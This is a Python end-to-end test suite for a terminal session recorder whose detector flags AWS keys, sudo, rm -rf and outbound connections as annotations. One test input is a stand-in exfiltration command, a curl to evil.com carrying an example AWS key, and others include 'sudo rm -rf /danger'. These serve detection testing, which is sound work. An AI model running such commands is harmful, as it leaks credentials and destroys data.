#
# SPDX-FileCopyrightText: Copyright (c) 2025-2026 provide.io llc. All rights reserved.
# SPDX-License-Identifier: AGPL-3.0-or-later
#
"""E2E tests for session annotation — detector, REST endpoint, and recording queries.

Each test spins up a live uvicorn server with recording enabled, starts a hosted
session runtime, triggers the PatternDetector via the runtime's internal logging,
and verifies annotations through the REST API.
"""

from __future__ import annotations

import asyncio
import contextlib
import tempfile
from typing import Any

import httpx
import uvicorn
from provide.terminal.bridge.hub import EventBus
from provide.terminal.server.app import create_server_app
from provide.terminal.server.config import config_from_mapping

ADMIN_H = {"X-Uterm-Principal": "admin-user", "X-Uterm-Role": "admin"}


@contextlib.asynccontextmanager
async def _live_server_with_recording(
    sessions: list[dict[str, Any]],
    *,
    label: str = "annotation_e2e",
    startup_timeout: float = 5.0,
    shutdown_timeout: float = 5.0,
) -> Any:
    """Spin up a live uvicorn server with recording enabled in a temp directory.

    Yields ``(registry, base_url)`` where *registry* is the SessionRegistry
    (giving access to runtimes) and *base_url* is ``http://127.0.0.1:<port>``.
    """
    with tempfile.TemporaryDirectory() as tmpdir:
        cfg = config_from_mapping(
            {
                "server": {"host": "127.0.0.1", "port": 0},
                "auth": {"mode": "dev"},
                "recording": {
                    "enabled_by_default": True,
                    "directory": tmpdir,
                    "flush_interval_s": 0.05,
                },
                "sessions": sessions,
            }
        )
        app = create_server_app(cfg)
        config = uvicorn.Config(app, host="127.0.0.1", port=0, log_level="critical")
        server = uvicorn.Server(config)
        task = asyncio.create_task(server.serve())

        loop = asyncio.get_running_loop()
        deadline = loop.time() + startup_timeout
        while not server.started:
            if loop.time() > deadline:
                server.should_exit = True
                with contextlib.suppress(Exception):
                    await asyncio.wait_for(task, timeout=2.0)
                raise RuntimeError(f"{label}: uvicorn startup timeout")
            await asyncio.sleep(0.05)

        port: int = server.servers[0].sockets[0].getsockname()[1]
        base_url = f"http://127.0.0.1:{port}"

        registry = app.state.uterm_registry
        # Explicitly update public_base_url to the dynamic port so 
        # HostedSessionRuntime can connect its worker bridge properly.
        registry._public_base_url = base_url
        
        hub = registry._hub
        hub._event_bus = EventBus()

        try:
            yield registry, base_url
        finally:
            server.should_exit = True
            with contextlib.suppress(Exception):
                await asyncio.wait_for(task, timeout=shutdown_timeout)


def _session(sid: str) -> dict[str, Any]:
    """Build a single session config dict with recording enabled."""
    return {
        "session_id": sid,
        "display_name": f"Annotation Test {sid}",
        "connector_type": "shell",
        "auto_start": False,
        "recording_enabled": True,
    }


async def _start_and_get_runtime(
    registry: Any,
    base_url: str,
    session_id: str,
) -> Any:
    """Start a session via REST and return the runtime with an active logger."""
    async with httpx.AsyncClient(base_url=base_url, headers=ADMIN_H, timeout=10.0) as http:
        resp = await http.post(f"/api/sessions/{session_id}/connect")
        assert resp.status_code == 200

    # Give the runtime a moment to start its connector and logger
    deadline = asyncio.get_running_loop().time() + 5.0
    while asyncio.get_running_loop().time() < deadline:
        runtime = registry.get_runtime(session_id)
        if runtime is not None and runtime._logger is not None:
            return runtime
        await asyncio.sleep(0.05)

    raise RuntimeError(f"runtime for {session_id} did not start within timeout")


async def _get_annotations(base_url: str, session_id: str) -> list[dict[str, Any]]:
    """Query recording entries for annotation events."""
    async with httpx.AsyncClient(base_url=base_url, headers=ADMIN_H, timeout=10.0) as http:
        resp = await http.get(f"/api/sessions/{session_id}/recording/entries?event=annotation")
        assert resp.status_code == 200
        return resp.json()


async def _get_all_entries(base_url: str, session_id: str) -> list[dict[str, Any]]:
    """Query all recording entries (no event filter)."""
    async with httpx.AsyncClient(base_url=base_url, headers=ADMIN_H, timeout=10.0) as http:
        resp = await http.get(f"/api/sessions/{session_id}/recording/entries")
        assert resp.status_code == 200
        return resp.json()


# ---------------------------------------------------------------------------
# 1. Detector catches AWS key in snapshot
# ---------------------------------------------------------------------------


async def test_detector_catches_aws_key_in_snapshot() -> None:
    """Worker snapshot containing an AWS access key triggers a credential_exposure annotation."""
    async with _live_server_with_recording([_session("aws1")]) as (registry, base_url):
        runtime = await _start_and_get_runtime(registry, base_url, "aws1")

        await runtime._log_snapshot({"screen": "export AWS_KEY=AKIAIOSFODNN7EXAMPLE"})
        await asyncio.sleep(0.1)
        if runtime._logger:
            await runtime._logger.flush()

        annotations = await _get_annotations(base_url, "aws1")
        assert len(annotations) >= 1
        labels = {a["data"]["label"] for a in annotations}
        assert "credential_exposure" in labels
        cred = next(a for a in annotations if a["data"]["label"] == "credential_exposure")
        assert cred["data"]["severity"] == "high"
        assert cred["data"]["source"] == "detector"


# ---------------------------------------------------------------------------
# 2. Detector catches sudo in input (send)
# ---------------------------------------------------------------------------


async def test_detector_catches_sudo_in_input() -> None:
    """Input containing 'sudo' triggers a privilege_escalation annotation."""
    async with _live_server_with_recording([_session("sudo1")]) as (registry, base_url):
        runtime = await _start_and_get_runtime(registry, base_url, "sudo1")

        await runtime._log_send("sudo systemctl restart nginx")
        await asyncio.sleep(0.1)
        if runtime._logger:
            await runtime._logger.flush()

        annotations = await _get_annotations(base_url, "sudo1")
        labels = {a["data"]["label"] for a in annotations}
        assert "privilege_escalation" in labels


# ---------------------------------------------------------------------------
# 3. Detector catches rm -rf (destructive command)
# ---------------------------------------------------------------------------


async def test_detector_catches_rm_rf() -> None:
    """Input containing 'rm -rf' triggers a destructive_command annotation."""
    async with _live_server_with_recording([_session("rmrf1")]) as (registry, base_url):
        runtime = await _start_and_get_runtime(registry, base_url, "rmrf1")

        await runtime._log_send("rm -rf /tmp/old-data")
        await asyncio.sleep(0.1)
        if runtime._logger:
            await runtime._logger.flush()

        annotations = await _get_annotations(base_url, "rmrf1")
        labels = {a["data"]["label"] for a in annotations}
        assert "destructive_command" in labels
        destructive = next(a for a in annotations if a["data"]["label"] == "destructive_command")
        assert destructive["data"]["severity"] == "critical"


# ---------------------------------------------------------------------------
# 4. Detector catches ssh outbound connection
# ---------------------------------------------------------------------------


async def test_detector_catches_ssh_outbound() -> None:
    """Snapshot containing 'ssh user@host' triggers an outbound_connection annotation."""
    async with _live_server_with_recording([_session("ssh1")]) as (registry, base_url):
        runtime = await _start_and_get_runtime(registry, base_url, "ssh1")

        await runtime._log_snapshot({"screen": "$ ssh admin@production-server.example.com"})
        await asyncio.sleep(0.1)
        if runtime._logger:
            await runtime._logger.flush()

        annotations = await _get_annotations(base_url, "ssh1")
        labels = {a["data"]["label"] for a in annotations}
        assert "outbound_connection" in labels
        conn = next(a for a in annotations if a["data"]["label"] == "outbound_connection")
        assert conn["data"]["severity"] == "info"


# ---------------------------------------------------------------------------
# 5. Detector catches exit (lifecycle event)
# ---------------------------------------------------------------------------


async def test_detector_catches_exit() -> None:
    """Input containing 'exit' triggers a session_lifecycle annotation."""
    async with _live_server_with_recording([_session("exit1")]) as (registry, base_url):
        runtime = await _start_and_get_runtime(registry, base_url, "exit1")

        await runtime._log_send("exit")
        await asyncio.sleep(0.1)
        if runtime._logger:
            await runtime._logger.flush()

        annotations = await _get_annotations(base_url, "exit1")
        labels = {a["data"]["label"] for a in annotations}
        assert "session_lifecycle" in labels


# ---------------------------------------------------------------------------
# 6. No false positive on normal text
# ---------------------------------------------------------------------------


async def test_no_false_positive_on_normal_text() -> None:
    """A snapshot with normal terminal output produces no annotation events."""
    async with _live_server_with_recording([_session("clean1")]) as (registry, base_url):
        runtime = await _start_and_get_runtime(registry, base_url, "clean1")

        await runtime._log_snapshot({"screen": "user@host:~$ ls -la\ntotal 42\ndrwxr-xr-x 5 user staff"})
        await runtime._log_send("ls -la\n")
        await asyncio.sleep(0.1)
        if runtime._logger:
            await runtime._logger.flush()

        annotations = await _get_annotations(base_url, "clean1")
        assert annotations == []


# ---------------------------------------------------------------------------
# 7. Agent self-annotation via REST
# ---------------------------------------------------------------------------


async def test_agent_self_annotation_via_rest() -> None:
    """POST /api/sessions/{id}/annotate creates an annotation visible in recording entries."""
    async with _live_server_with_recording([_session("rest1")]) as (registry, base_url):
        runtime = await _start_and_get_runtime(registry, base_url, "rest1")

        async with httpx.AsyncClient(base_url=base_url, headers=ADMIN_H, timeout=10.0) as http:
            resp = await http.post(
                "/api/sessions/rest1/annotate",
                json={
                    "label": "deploy-v2.0",
                    "description": "production deployment started",
                    "severity": "info",
                },
            )
            assert resp.status_code == 200
            assert "ts" in resp.json()

        await asyncio.sleep(0.1)
        if runtime._logger:
            await runtime._logger.flush()

        annotations = await _get_annotations(base_url, "rest1")
        assert len(annotations) >= 1
        agent_annotations = [a for a in annotations if a["data"].get("source") == "agent"]
        assert len(agent_annotations) >= 1
        assert agent_annotations[0]["data"]["label"] == "deploy-v2.0"
        assert agent_annotations[0]["data"]["description"] == "production deployment started"


# ---------------------------------------------------------------------------
# 8. Multiple annotations in one snapshot
# ---------------------------------------------------------------------------


async def test_multiple_annotations_in_one_snapshot() -> None:
    """A snapshot with multiple pattern matches produces multiple annotations."""
    async with _live_server_with_recording([_session("multi1")]) as (registry, base_url):
        runtime = await _start_and_get_runtime(registry, base_url, "multi1")

        # This text contains: sudo (escalation), curl (connection), and an AWS key (credentials)
        text = "sudo curl https://evil.com/exfil?key=AKIAIOSFODNN7EXAMPLE"
        await runtime._log_send(text)
        await asyncio.sleep(0.1)
        if runtime._logger:
            await runtime._logger.flush()

        annotations = await _get_annotations(base_url, "multi1")
        labels = {a["data"]["label"] for a in annotations}
        # Should have at least credentials, escalation, and connection annotations
        assert "credential_exposure" in labels
        assert "privilege_escalation" in labels
        assert "outbound_connection" in labels
        assert len(annotations) >= 3


# ---------------------------------------------------------------------------
# 9. Annotations visible in recording download
# ---------------------------------------------------------------------------


async def test_annotations_visible_in_recording_download() -> None:
    """Annotation events appear in the raw JSONL recording download."""
    async with _live_server_with_recording([_session("dl1")]) as (registry, base_url):
        runtime = await _start_and_get_runtime(registry, base_url, "dl1")

        await runtime._log_snapshot({"screen": "AKIAIOSFODNN7EXAMPLE leaked"})
        await asyncio.sleep(0.1)
        if runtime._logger:
            await runtime._logger.flush()

        async with httpx.AsyncClient(base_url=base_url, headers=ADMIN_H, timeout=10.0) as http:
            resp = await http.get("/api/sessions/dl1/recording/download")
            assert resp.status_code == 200

        # Parse the JSONL content
        import json

        lines = resp.text.strip().split("\n")
        entries = [json.loads(line) for line in lines if line.strip()]
        annotation_entries = [e for e in entries if e.get("event") == "annotation"]
        assert len(annotation_entries) >= 1
        assert annotation_entries[0]["data"]["label"] == "credential_exposure"


# ---------------------------------------------------------------------------
# 10. Annotations queryable with event filter
# ---------------------------------------------------------------------------


async def test_annotations_queryable_with_event_filter() -> None:
    """GET /recording/entries?event=annotation returns only annotation events."""
    async with _live_server_with_recording([_session("filt1")]) as (registry, base_url):
        runtime = await _start_and_get_runtime(registry, base_url, "filt1")

        # Generate both annotations and regular events
        await runtime._log_snapshot({"screen": "sudo rm -rf /danger"})
        await runtime._log_send("echo hello\n")
        await asyncio.sleep(0.1)
        if runtime._logger:
            await runtime._logger.flush()

        # Filtered: only annotations
        annotations = await _get_annotations(base_url, "filt1")
        for entry in annotations:
            assert entry["event"] == "annotation"

        # Unfiltered: should have more entries (screen, send, annotation, etc.)
        all_entries = await _get_all_entries(base_url, "filt1")
        event_types = {e.get("event") for e in all_entries}
        # At least annotation and some other event type
        assert "annotation" in event_types
        assert len(event_types) > 1

        # Verify filtered count is less than total
        assert len(annotations) < len(all_entries)


# ---------------------------------------------------------------------------
# 11. Detector annotation includes span with sequence number
# ---------------------------------------------------------------------------


async def test_detector_annotation_includes_span() -> None:
    """Detector-produced annotations include span with from_seq and to_seq."""
    async with _live_server_with_recording([_session("span1")]) as (registry, base_url):
        runtime = await _start_and_get_runtime(registry, base_url, "span1")

        await runtime._log_snapshot({"screen": "AKIAIOSFODNN7EXAMPLE"})
        await asyncio.sleep(0.1)
        if runtime._logger:
            await runtime._logger.flush()

        annotations = await _get_annotations(base_url, "span1")
        assert len(annotations) >= 1
        span = annotations[0]["data"].get("span")
        assert span is not None
        assert "from_seq" in span
        assert "to_seq" in span
        assert span["from_seq"] == span["to_seq"]


# ---------------------------------------------------------------------------
# 12. Multiple snapshots produce separate annotations with increasing seq
# ---------------------------------------------------------------------------


async def test_multiple_snapshots_increasing_seq() -> None:
    """Two snapshots with patterns produce annotations with distinct increasing sequence numbers."""
    async with _live_server_with_recording([_session("seq1")]) as (registry, base_url):
        runtime = await _start_and_get_runtime(registry, base_url, "seq1")

        await runtime._log_snapshot({"screen": "AKIAIOSFODNN7EXAMPLE first"})
        await runtime._log_snapshot({"screen": "AKIAIOSFODNN7EXAMPLE second"})
        await asyncio.sleep(0.1)
        if runtime._logger:
            await runtime._logger.flush()

        annotations = await _get_annotations(base_url, "seq1")
        cred_annotations = [a for a in annotations if a["data"]["label"] == "credential_exposure"]
        assert len(cred_annotations) >= 2
        seq1 = cred_annotations[0]["data"]["span"]["from_seq"]
        seq2 = cred_annotations[1]["data"]["span"]["from_seq"]
        assert seq2 > seq1
